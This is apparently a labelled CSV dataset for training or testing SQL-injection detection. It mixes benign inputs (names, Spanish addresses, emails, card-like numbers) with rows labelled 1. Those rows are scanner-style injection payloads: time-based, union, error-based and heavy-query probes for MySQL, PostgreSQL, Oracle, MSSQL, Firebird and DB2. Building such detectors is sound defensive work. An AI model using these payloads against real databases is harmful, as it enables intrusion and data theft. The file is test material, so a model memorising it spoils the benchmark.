Query,Label
09133,0
07559284n,0
0er_rugneo,0
"c/ portal de zamudio 65,",0
a55r4e1a,0
organizar,0
bosier@opel-e-flex.bn,0
94335965q,0
mertin lombana,0
"1) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (8929=8929",1
1);select (case when (3626=6022) then 3626 else cast(1 as int)/(select 0 from dual) end) from dual--,1
petn,0
"c/ torregrossa, 3",0
47,0
begues,0
buch als,0
"1)) as vycb where 3524=3524 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"1 and 3824=benchmark(5000000,md5(0x76555642))",1
37655511a,0
0andiar,0
francisco jorquera s/n 1?d,0
"1)) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((4090=4090",1
cavey.cox@directoriogratuito.ec,0
"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",1
40162,0
"1%"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
b3zucar,0
nalia,0
"1%"")) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""%""=""",1
follosas,0
6736,0
faustino cavadas 162 6-a,0
5657119326927439,0
"calle la rambla de el saler, 25",0
8278542612863409,0
8088,0
37329,0
"-6629%""))) or 8571=8571--",1
henckels@easyviaggio.tr,0
1'))) rlike (select * from (select(sleep(5)))sgvo) and ((('wuux'='wuux,1
borrachero muros,0
11203636z,0
6743669195924554,0
gila-berova@artforall.mm,0
rutilant+e,0
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('nczi'='nczi",1
"1' in boolean mode) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)#",1
vanity@espaciodelpintor.kn,0
"-9751""))) or 5929=3884--",1
gaudencio,0
85063049x,0
70,0
westgart,0
abarrategui allende,0
-1772' or 7911=4985#,1
40184,0
29320,0
1))) waitfor delay '0:0:5'--,1
5854367786451207,0
35591968c,0
"1) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",1
"1'))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((('aqdj'='aqdj",1
1') where 7908=7908 or sleep(5)--,1
39638,0
calle relleu 159,0
"-5596'))) union all select 4877,4877,4877,4877,4877,4877,4877,4877,4877,4877--",1
27404814s,0
corbera d'ebre,0
esclarecidamente,0
"-9596) where 3425=3425 union all select 3425,3425,3425,3425,3425,3425#",1
couto capellades,0
92624028s,0
se5ap62o,0
foguear,0
"1)) as vryv where 5600=5600;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1) union all select null,null,null,null#",1
03046730n,0
45908,0
educativa,0
58698300t,0
requena de campos,0
masegosa,0
4713791605534130,0
"1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",1
clrici panella,0
weld@yiutuve.vc,0
"1'||(select 'czos' from dual where 6814=6814;select * from generate_series(6414,6414,case when (6414=6455) then 1 else 0 end) limit 1--",1
a2b66r5z,0
"1%"");select benchmark(5000000,md5(0x714e4153))#",1
"1"") as ifgl where 2190=2190 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",1
vallb remesar,0
09191,0
"alameda de gardn, la",0
1')));(select * from (select(sleep(5)))srmq) and ((('jirc'='jirc,1
1 where 7224=7224 and sleep(5)#,1
1') where 5286=5286;select (case when (1123=9550) then 1123 else 1123*(select 1123 from information_schema.character_sets) end)#,1
2569848242222580,0
"1 where 2914=2914 union all select null,null,null#",1
24830,0
47494,0
juan de dios,0
1'));select pg_sleep(5) and (('rnzp'='rnzp,1
"1) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (5098=5098",1
"1%')));select count(*) from generate_series(1,5000000) and ((('%'='",1
"1"")) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""opgb"" like ""opgb",1
5217,0
didani,0
"-2639"") where 1494=1494 union all select 1494--",1
barbimore_na,0
"1) as wokl where 1368=1368 union all select null,null,null,null,null,null--",1
-6512'+(select 'zdjx' where 5454=5454 order by 1--,1
1');select (case when (5423=7706) then 5423 else cast(1 as int)/(select 0 from dual) end) from dual--,1
ensaa6o,0
1438,0
fuente de piedra,0
"1"") where 7578=7578 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
saia,0
27340064x,0
zauhar,0
"1%"") or 4240=(select 4240 from pg_sleep(5))--",1
lagata,0
"1"" where 2677=2677 and (select * from (select(sleep(5)))fzno)--",1
laskowska.angelus@juegosgratisinternet.lt,0
0277189059505279,0
"1"") where 6138=6138 and 8594=(select 8594 from pg_sleep(5))--",1
8916,0
3244290959091087,0
3572857528910134,0
"1' in boolean mode) union all select null,null,null,null,null,null#",1
10460,0
orbita,0
-8513' union all select 7414--,1
1) as ryks where 1196=1196;select (case when (1005=5996) then 1 else 1005*(select 1005 from master..sysdatabases) end)--,1
540,0
bogs terradas,0
38626822r,0
mebine,0
"-1485'))) union all select 7661,7661,7661,7661,7661--",1
cami del fredolic 115,0
1'))) and 8594=(select 8594 from pg_sleep(5))--,1
"1"" where 2462=2462 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
begur,0
1);waitfor delay '0:0:5',1
81012741w,0
fuente-lamo,0
1') where 5145=5145;if(2823=3532) select 2823 else drop function kmqw--,1
8648898617825850,0
"1 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1
haroun,0
"c/ duque de medinaceli, 55, 3?f",0
ors,0
"-1079"") where 2865=2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",1
"1""))) and sleep(5)#",1
"1%"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""%""=""",1
05350,0
cen,0
retiendas,0
daochuan,0
ario,0
"1"";select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",1
1084,0
5230108987533758,0
"calle orion 74,",0
calle liebre 195,0
08698,0
"1%'))) and 3824=benchmark(5000000,md5(0x76555642)) and ((('%'='",1
"camino cementerio, s/n,",0
pedrosa de duero,0
hardin5,0
bugarra,0
amn,0
saiah.bauer@intapisur.mc,0
geldres pittaluga,0
"1' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",1
ebert@lamola-hotel.rw,0
-5217 where 3620=3620 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,1
vvido,0
-8652') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),1
"calle jose espejo, 130, 12?a",0
garrafe de toro,0
37170,0
1 and (3020=3020)*6703# syuj,1
70536583e,0
reinald,0
"1'+(select 'lawc' where 1171=1171 or 8156=(select count(*) from generate_series(1,5000000))--",1
ji1a,0
"1"") where 2873=2873 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
pilapil@espaciopintor.my,0
boothe,0
60511130q,0
"1"") as paai where 4089=4089 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
milligan,0
"-2570"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""dmch"" like ""dmch",1
"c/ hermenegilda portillo, 70",0
furia@gallegonicolas.bf,0
"1"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""kbex"" like ""kbex",1
trung,0
"1"") where 7753=7753;select pg_sleep(5)--",1
dantas.pellegrim4@nanotecnologo.kr,0
"1))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((4234=4234",1
eggebraa,0
1))) or (select * from (select(sleep(5)))sddo)#,1
95105299t,0
lan,0
elissa,0
teodosio,0
"1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('wdru' like 'wdru",1
hontanares de eresma,0
3213958805114016,0
1 and 8398=1891-- naov,1
keer,0
"vdola, la",0
4a39c44a,0
5447434200049270,0
-4173') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('jdwt' like 'jdwt,1
koontz,0
"1'))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
allaert@chicasdiabolo.ru,0
4241,0
"-2007%')) union all select 7298,7298,7298#",1
"c/ vapor, 148, 2?a",0
"1));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1' and elt(4249=4249,7259) and 'awjd'='awjd",1
pesado,0
caldes,0
"1"" and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""lgwe"" like ""lgwe",1
26213,0
(select 2412=('qqpjq'||(select case 2412 when 2412 then 1 else 0 end from rdb$database)||'qzvzq')),1
quebrador,0
45790,0
48083550a,0
"1%')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('%'='",1
80scip7l1da,0
"carretera barajas, 147,",0
"-9932"" union all select 4049,4049,4049--",1
aburgues1rs7,0
"1"";select (case when (3855=3855) then 3855 else 1/(select 0) end)--",1
yn,0
larreynaga arce,0
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""mkal"" like ""mkal",1
"1%"" and make_set(8403=8403,8899) and ""%""=""",1
1621765359998786,0
"-2518' union all select 6818,6818,6818,6818,6818,6818#",1
8703807831121479,0
"1%""));select count(*) from generate_series(1,5000000) and ((""%""=""",1
6684,0
cryoelec,0
19277,0
corey,0
"1"" where 8571=8571;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
21335513t,0
rascel-byatt@discotecateatre.ug,0
p+lyade,0
maula,0
calle la fuente 116 2?e,0
limpias,0
escudero ostria,0
5arneci052,0
1'+(select goec where 9460=9460 rlike (select (case when (4740=1203) then 1 else 0x28 end)))+',1
58c058ars4,0
c/ enrique marias 129,0
7400285622819954,0
-9212 or 1026=7967#,1
"1)) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ican' like 'ican",1
"-1949"")) as urke where 8761=8761 union all select 8761,8761,8761,8761,8761,8761,8761#",1
nihei_donat@multaspendientes.cu,0
alejandro,0
42148,0
tennant.depusse@dissident.ie,0
lloyd-pack-partain@elalamorestaurante.ir,0
aldebar,0
ambrose,0
raina.schiavelli@hosterialasmajadillas.de,0
"1%')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((('%'='",1
cualquiera,0
doron@beljos.ch,0
"1' and 8407=(select count(*) from generate_series(1,5000000)) and 'wytg'='wytg",1
"1"") as ebvt where 5305=5305;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
"1 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
bumatai@aldufa.pf,0
1 where 5828=5828 and (3020=3020)*6703--,1
landesman@cohel.mw,0
insanable,0
1') where 5491=5491 and 9198=9198--,1
"1""))) union all select null,null,null,null,null#",1
18555,0
brihuega uslet,0
bellveh badrenas,0
"-9160') union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",1
9p30a,0
ntpadmin,0
"1"")) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
"1%'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('%'='",1
"-5622"" where 7970=7970 union all select 7970,7970,7970,7970,7970--",1
16,0
6963,0
03759,0
kiley,0
"1""));begin dbms_lock.sleep(5); end--",1
1'))) rlike (select * from (select(sleep(5)))sgvo) and ((('uzmy' like 'uzmy,1
1'));(select * from (select(sleep(5)))acdk)#,1
celadas,0
hymen_israeli@aulahost.vc,0
20223132z,0
"-9959"") where 7073=7073 union all select 7073,7073,7073,7073,7073,7073,7073,7073#",1
"1"");waitfor delay '0:0:5' and (""dmcu""=""dmcu",1
atilio,0
1))) or (select * from (select(sleep(5)))ydpu) and (((3332=3332,1
6410439898425847,0
1)) as fpej where 6790=6790 and (3020=3020)*6703--,1
deba,0
1523492896649032,0
7512207991188731,0
basedow@hiteurope.fo,0
latin,0
barot holm,0
alan sellars,0
gowan,0
tejeda,0
mamantona,0
1ojador,0
1309699590331954,0
6748546919009265,0
"-4462%"") or 8571=8571--",1
sofridera,0
"calle da unidade, 184 7e",0
"1%')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('%'='",1
-2929'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('nzmk'='nzmk,1
37425321c,0
herrera,0
"-5832"") or 1650=9011--",1
3929,0
las palmas,0
silas,0
"1%') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'='",1
ubaldo,0
1) where 7050=7050;waitfor delay '0:0:5'--,1
argerich tries,0
hartling@solmicro-erp.dz,0
"1"")) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""giuq""=""giuq",1
"1%"" union all select null,null#",1
"chato de la isla, 50 10-g",0
"1""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""jzsb""=""jzsb",1
"-3137'||(select 'btif' where 1718=1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",1
"1%"")) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"avda. juan carlos i, 195, 6f",0
"1"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
boys@muebetuweb.mu,0
8652159260069074,0
proffit,0
ilsup,0
garabero,0
1'||(select 'tjzy' where 3037=3037;select sleep(5))||',1
47355557y,0
bertolda,0
"masroig, el",0
lozier,0
"1%"" or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""%""=""",1
roderigo,0
einstein@shamballa-pneuma.st,0
22167302v,0
terribas,0
"1') where 8125=8125 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
"calle diseminado hornos de rey 29, 7?b",0
steele,0
"1 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
-4979')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('ofgg'='ofgg,1
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ('njnr'='njnr",1
cabrejas del pinar,0
1)) as wwkw where 7289=7289 and 7533=7533--,1
"1%""))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""",1
dordas berttony,0
palls de buran,0
doriot,0
barnhill,0
calle xaxan 137 10?c,0
34475,0
6e0turer2,0
20560,0
techumbre,0
"1') as jysm where 8961=8961 union all select null,null#",1
teodosia,0
"calle valencia de don juan 161, 7?d",0
6034871098442134,0
"1%"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
calle estafeta 105 6c,0
villadoz,0
2875083717333458,0
5x8r0r,0
"1%')) or 8466=benchmark(5000000,md5(0x694a4745)) and (('%'='",1
bermdez delvalle,0
34260,0
81180031j,0
-3059') as jhbh where 4056=4056 or (3498=6965)*6965--,1
1));select (case when (8113=8981) then 8113 else 1/(select 0) end)--,1
"1',(begin if (8340=8340) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;)",1
46460133h,0
medina-sidonia,0
"1"")));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",1
"1' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and 'rupq'='rupq",1
pursima,0
1')) and (7517=3423)*3423 and (('aenz'='aenz,1
12306474w,0
frontera,0
1304,0
condal talero,0
tienchie,0
escarpelo,0
"1'||(select 'xtcb' where 5240=5240;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",1
"1"") and make_set(8403=8403,8899) and (""dhss""=""dhss",1
"1'+(select rdpe where 6553=6553 or elt(6272=6272,sleep(5)))+'",1
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('javh'='javh",1
"1""))) and elt(1210=1210,sleep(5)) and (((""ilge"" like ""ilge",1
broto,0
"1%'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('%'='",1
richarde@zarahealth.bz,0
d119a,0
07342606v,0
8578,0
cinthia,0
"1') where 6941=6941 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",1
82751097h,0
alpargatera,0
24566,0
"calle molin el toro 28,",0
"1""))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""ecoa"" like ""ecoa",1
shing-mi,0
"1"")));select (case when (4059=7807) then 4059 else 1/(select 0) end)--",1
con79lecimie91o,0
"-1272' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"calle escritor bono i barber, 132, 2?b",0
09491,0
cabro,0
"1) union all select null,null,null,null,null,null,null--",1
0452635229820629,0
bienvenido,0
meara,0
forfoleda,0
"1) where 5096=5096 and 8635=(select count(*) from generate_series(1,5000000))--",1
paseo canteras 75,0
8421938464583223,0
el cartero 44 5-b,0
4244,0
-5470')) or (8459=8459)*4906 and (('oeam'='oeam,1
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('xgzb'='xgzb",1
